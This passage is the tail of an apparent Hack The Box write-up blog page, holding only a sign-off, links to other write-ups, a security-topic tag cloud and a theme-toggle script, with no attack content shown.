<br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br> Thanks for reading.
<br>
<br>
<br> Previous Hack The Box write-up : <a href="/hack-the-box/ctf/">Hack The Box - CTF</a>
<br> Next Hack The Box write-up : <a href="/hack-the-box/fortune/">Hack The Box - Fortune</a></p>
<hr>


</div>





<div class="related">
  <h2>other posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/hack-the-box/luke/">
            Hack The Box - Luke
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/bastion/">
            Hack The Box - Bastion
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/bastion-2/">
            Hack The Box - Bastion (Commando)
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>All Tags</h2>
  <div class="tag-cloud">
<a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-3">binary-exploitation</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-2">windows-exploitation</a> <a href="/tag/wordpress/" class="set-1">wordpress</a>
</div>
  



      </div>
    </main><footer class="site-footer">
	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
  <div class="wrapper">
<div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked>
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
if (localStorage.getItem("theme") === null) {
    window.localStorage.setItem('theme', 'dark');
}
const theme = localStorage.getItem('theme');
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

if (theme === "dark") {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
} else if (theme === "light") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
} else if  (userPrefers === "dark") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'dark');
	document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	window.localStorage.setItem('theme', 'dark');
	document.getElementById("theme-toggle").className = 'light';
} else {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'light');
	document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	window.localStorage.setItem('theme', 'light');
	document.getElementById("theme-toggle").className = 'dark';
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    document.documentElement.setAttribute('data-theme', 'light');
		document.documentElement.classList.add('theme--light');
        document.documentElement.classList.remove('theme--dark');
		window.localStorage.setItem('theme', 'light');
	    document.getElementById("theme-toggle").className = 'dark';
	} else {
	    document.documentElement.setAttribute('data-theme', 'dark');
		document.documentElement.classList.add('theme--dark');
        document.documentElement.classList.remove('theme--light');
		window.localStorage.setItem('theme', 'dark');
	    document.getElementById("theme-toggle").className = 'light';
	}
}
</script>
</div>
  
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
